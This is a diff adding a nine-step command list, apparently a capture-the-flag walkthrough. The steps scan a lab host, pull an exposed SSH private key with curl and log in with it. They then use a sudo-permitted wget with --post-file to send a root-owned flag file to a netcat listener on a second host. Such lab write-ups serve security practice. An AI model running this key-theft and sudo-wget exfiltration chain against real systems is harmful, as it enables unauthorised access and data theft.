@@ -1,0 +1,9 @@
+1 - nmap -A -p- 10.10.90.117
+2 - gobuster dir -u http://10.10.90.117 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+3 - gobuster dir -u http://10.10.90.117/sitemap -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - curl -s http://10.10.90.117/sitemap/.ssh/id_rsa
+5 - ssh -i id_rsa jessie@10.10.90.117
+6 - cat Documents/user_flag.txt
+7 - sudo -l (wget)
+8 - nc -lvnp 4444
+9 - sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.8.94.51:4444
